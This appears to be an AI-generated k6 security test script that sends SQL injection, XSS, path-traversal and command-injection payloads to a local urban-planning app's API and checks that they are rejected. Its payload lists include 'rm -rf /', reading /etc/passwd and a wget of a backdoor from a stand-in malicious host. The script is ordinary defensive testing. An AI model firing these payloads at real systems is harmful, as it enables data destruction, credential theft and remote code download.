# Created automatically by Cursor AI (2025-08-25)
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate } from 'k6/metrics';

// Custom metrics
const securityVulnerabilities = new Rate('security_vulnerabilities');
const authenticationFailures = new Rate('auth_failures');

// Test configuration
export const options = {
  stages: [
    { duration: '1m', target: 3 },  // Ramp up
    { duration: '2m', target: 3 },  // Security testing
    { duration: '1m', target: 0 },  // Ramp down
  ],
  thresholds: {
    security_vulnerabilities: ['rate<0.1'], // Should have very few vulnerabilities
    auth_failures: ['rate<0.2'],            // Auth failures should be low
  },
};

const BASE_URL = __ENV.BASE_URL || 'http://localhost:3000';

// SQL Injection payloads
const sqlInjectionPayloads = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "' UNION SELECT * FROM users --",
  "1' OR '1' = '1' --",
  "admin'--",
  "1; INSERT INTO users VALUES ('hacker', 'password'); --"
];

// XSS payloads
const xssPayloads = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "javascript:alert('XSS')",
  "<svg onload=alert('XSS')>",
  "'><script>alert('XSS')</script>",
  "<iframe src=javascript:alert('XSS')>"
];

// Path traversal payloads
const pathTraversalPayloads = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
];

// Command injection payloads
const commandInjectionPayloads = [
  "; ls -la",
  "| cat /etc/passwd",
  "&& whoami",
  "; rm -rf /",
  "| wget http://malicious.com/backdoor"
];

export default function() {
  const testType = Math.floor(Math.random() * 8);
  
  switch (testType) {
    case 0:
      testSQLInjection();
      break;
    case 1:
      testXSS();
      break;
    case 2:
      testPathTraversal();
      break;
    case 3:
      testCommandInjection();
      break;
    case 4:
      testAuthenticationBypass();
      break;
    case 5:
      testAuthorization();
      break;
    case 6:
      testInputValidation();
      break;
    case 7:
      testObjectStoreScope();
      break;
  }
  
  sleep(Math.random() * 2 + 1);
}

function testSQLInjection() {
  const payload = sqlInjectionPayloads[Math.floor(Math.random() * sqlInjectionPayloads.length)];
  
  // Test in site name
  const response = http.post(`${BASE_URL}/api/sites`, JSON.stringify({
    name: payload,
    area: '1.0',
    boundary: {
      type: 'FeatureCollection',
      features: [{
        type: 'Feature',
        properties: { name: 'Test Site' },
        geometry: {
          type: 'Polygon',
          coordinates: [[[0, 0], [1, 0], [1, 1], [0, 1], [0, 0]]]
        }
      }]
    }
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(response, {
    'SQL injection prevented': (r) => {
      // Should return 400 or 422, not 500 (server error)
      return r.status === 400 || r.status === 422 || r.status === 401;
    },
    'no SQL error in response': (r) => {
      const body = r.body.toLowerCase();
      return !body.includes('sql') && !body.includes('database') && !body.includes('syntax error');
    },
  }) || securityVulnerabilities.add(1);
  
  // Test in search parameters
  const searchResponse = http.get(`${BASE_URL}/api/sites?name=${encodeURIComponent(payload)}`, {
    headers: {
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(searchResponse, {
    'SQL injection in search prevented': (r) => {
      return r.status === 400 || r.status === 422 || r.status === 401;
    },
  }) || securityVulnerabilities.add(1);
}

function testXSS() {
  const payload = xssPayloads[Math.floor(Math.random() * xssPayloads.length)];
  
  // Test in site name
  const response = http.post(`${BASE_URL}/api/sites`, JSON.stringify({
    name: payload,
    area: '1.0',
    boundary: {
      type: 'FeatureCollection',
      features: [{
        type: 'Feature',
        properties: { name: payload },
        geometry: {
          type: 'Polygon',
          coordinates: [[[0, 0], [1, 0], [1, 1], [0, 1], [0, 0]]]
        }
      }]
    }
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(response, {
    'XSS in site name prevented': (r) => {
      return r.status === 400 || r.status === 422 || r.status === 401;
    },
  }) || securityVulnerabilities.add(1);
  
  // Test in properties
  const propertiesResponse = http.post(`${BASE_URL}/api/sites`, JSON.stringify({
    name: 'XSS Test Site',
    area: '1.0',
    properties: {
      description: payload,
      notes: payload
    },
    boundary: {
      type: 'FeatureCollection',
      features: [{
        type: 'Feature',
        properties: { name: 'Test Site' },
        geometry: {
          type: 'Polygon',
          coordinates: [[[0, 0], [1, 0], [1, 1], [0, 1], [0, 0]]]
        }
      }]
    }
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(propertiesResponse, {
    'XSS in properties prevented': (r) => {
      return r.status === 400 || r.status === 422 || r.status === 401;
    },
  }) || securityVulnerabilities.add(1);
}

function testPathTraversal() {
  const payload = pathTraversalPayloads[Math.floor(Math.random() * pathTraversalPayloads.length)];
  
  // Test in file upload
  const response = http.post(`${BASE_URL}/api/sites`, JSON.stringify({
    name: 'Path Traversal Test',
    area: '1.0',
    boundary: {
      type: 'FeatureCollection',
      features: [{
        type: 'Feature',
        properties: { 
          name: 'Test Site',
          filePath: payload
        },
        geometry: {
          type: 'Polygon',
          coordinates: [[[0, 0], [1, 0], [1, 1], [0, 1], [0, 0]]]
        }
      }]
    }
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(response, {
    'path traversal prevented': (r) => {
      return r.status === 400 || r.status === 422 || r.status === 401;
    },
  }) || securityVulnerabilities.add(1);
  
  // Test in file download
  const downloadResponse = http.get(`${BASE_URL}/api/files/${encodeURIComponent(payload)}`, {
    headers: {
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(downloadResponse, {
    'path traversal in download prevented': (r) => {
      return r.status === 400 || r.status === 404 || r.status === 401;
    },
  }) || securityVulnerabilities.add(1);
}

function testCommandInjection() {
  const payload = commandInjectionPayloads[Math.floor(Math.random() * commandInjectionPayloads.length)];
  
  // Test in export parameters
  const response = http.post(`${BASE_URL}/api/sites/test-id/export`, JSON.stringify({
    formats: ['geojson'],
    theme: payload,
    includeMaps: true
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(response, {
    'command injection prevented': (r) => {
      return r.status === 400 || r.status === 422 || r.status === 401;
    },
  }) || securityVulnerabilities.add(1);
  
  // Test in model parameters
  const modelResponse = http.post(`${BASE_URL}/api/sites/test-id/energy-model`, JSON.stringify({
    includeSolar: true,
    climateZone: payload,
    outputFormat: 'json'
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(modelResponse, {
    'command injection in model prevented': (r) => {
      return r.status === 400 || r.status === 422 || r.status === 401;
    },
  }) || securityVulnerabilities.add(1);
}

function testAuthenticationBypass() {
  // Test without authentication
  const noAuthResponse = http.post(`${BASE_URL}/api/sites`, JSON.stringify({
    name: 'Auth Bypass Test',
    area: '1.0',
    boundary: {
      type: 'FeatureCollection',
      features: [{
        type: 'Feature',
        properties: { name: 'Test Site' },
        geometry: {
          type: 'Polygon',
          coordinates: [[[0, 0], [1, 0], [1, 1], [0, 1], [0, 0]]]
        }
      }]
    }
  }), {
    headers: {
      'Content-Type': 'application/json'
    }
  });
  
  check(noAuthResponse, {
    'authentication required': (r) => r.status === 401,
  }) || authenticationFailures.add(1);
  
  // Test with invalid token
  const invalidTokenResponse = http.post(`${BASE_URL}/api/sites`, JSON.stringify({
    name: 'Invalid Token Test',
    area: '1.0',
    boundary: {
      type: 'FeatureCollection',
      features: [{
        type: 'Feature',
        properties: { name: 'Test Site' },
        geometry: {
          type: 'Polygon',
          coordinates: [[[0, 0], [1, 0], [1, 1], [0, 1], [0, 0]]]
        }
      }]
    }
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer invalid-token-12345'
    }
  });
  
  check(invalidTokenResponse, {
    'invalid token rejected': (r) => r.status === 401,
  }) || authenticationFailures.add(1);
  
  // Test with expired token
  const expiredTokenResponse = http.post(`${BASE_URL}/api/sites`, JSON.stringify({
    name: 'Expired Token Test',
    area: '1.0',
    boundary: {
      type: 'FeatureCollection',
      features: [{
        type: 'Feature',
        properties: { name: 'Test Site' },
        geometry: {
          type: 'Polygon',
          coordinates: [[[0, 0], [1, 0], [1, 1], [0, 1], [0, 0]]]
        }
      }]
    }
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
    }
  });
  
  check(expiredTokenResponse, {
    'expired token rejected': (r) => r.status === 401,
  }) || authenticationFailures.add(1);
}

function testAuthorization() {
  // Test accessing other user's data
  const otherUserResponse = http.get(`${BASE_URL}/api/sites/other-user-site-id`, {
    headers: {
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(otherUserResponse, {
    'unauthorized access prevented': (r) => r.status === 403 || r.status === 404,
  }) || securityVulnerabilities.add(1);
  
  // Test admin operations without admin role
  const adminResponse = http.delete(`${BASE_URL}/api/admin/users/some-user-id`, {
    headers: {
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(adminResponse, {
    'admin operations require admin role': (r) => r.status === 403,
  }) || securityVulnerabilities.add(1);
  
  // Test organization access
  const orgResponse = http.get(`${BASE_URL}/api/organizations/other-org-id/sites`, {
    headers: {
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(orgResponse, {
    'organization access controlled': (r) => r.status === 403 || r.status === 404,
  }) || securityVulnerabilities.add(1);
}

function testInputValidation() {
  // Test extremely large inputs
  const largeInput = 'A'.repeat(100000);
  
  const response = http.post(`${BASE_URL}/api/sites`, JSON.stringify({
    name: largeInput,
    area: '1.0',
    boundary: {
      type: 'FeatureCollection',
      features: [{
        type: 'Feature',
        properties: { name: 'Test Site' },
        geometry: {
          type: 'Polygon',
          coordinates: [[[0, 0], [1, 0], [1, 1], [0, 1], [0, 0]]]
        }
      }]
    }
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(response, {
    'large input rejected': (r) => r.status === 400 || r.status === 413,
  }) || securityVulnerabilities.add(1);
  
  // Test malformed JSON
  const malformedResponse = http.post(`${BASE_URL}/api/sites`, '{"name": "test", "area": "1.0", "boundary": {', {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(malformedResponse, {
    'malformed JSON rejected': (r) => r.status === 400,
  }) || securityVulnerabilities.add(1);
  
  // Test invalid content type
  const invalidContentTypeResponse = http.post(`${BASE_URL}/api/sites`, '{"name": "test"}', {
    headers: {
      'Content-Type': 'text/plain',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(invalidContentTypeResponse, {
    'invalid content type rejected': (r) => r.status === 400 || r.status === 415,
  }) || securityVulnerabilities.add(1);
}

function testObjectStoreScope() {
  // Test accessing files outside user scope
  const scopeResponse = http.get(`${BASE_URL}/api/files/../../../other-user-file.txt`, {
    headers: {
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(scopeResponse, {
    'object store scope enforced': (r) => r.status === 403 || r.status === 404,
  }) || securityVulnerabilities.add(1);
  
  // Test uploading to restricted locations
  const uploadResponse = http.post(`${BASE_URL}/api/files/upload`, JSON.stringify({
    path: '/etc/passwd',
    content: 'test content'
  }), {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(uploadResponse, {
    'restricted upload locations blocked': (r) => r.status === 400 || r.status === 403,
  }) || securityVulnerabilities.add(1);
  
  // Test accessing system files
  const systemFileResponse = http.get(`${BASE_URL}/api/files/system/config.json`, {
    headers: {
      'Authorization': 'Bearer test-token'
    }
  });
  
  check(systemFileResponse, {
    'system files access blocked': (r) => r.status === 403 || r.status === 404,
  }) || securityVulnerabilities.add(1);
}

export function setup() {
  console.log('Starting security testing for AI Urban Planner Crew');
  console.log(`Base URL: ${BASE_URL}`);
  console.log('Testing SQL injection, XSS, path traversal, command injection, authentication, authorization, input validation, and object store scope');
}

export function teardown(data) {
  console.log('Security testing completed');
  console.log(`Security vulnerabilities found: ${data.metrics.security_vulnerabilities.values.rate}`);
  console.log(`Authentication failures: ${data.metrics.auth_failures.values.rate}`);
}
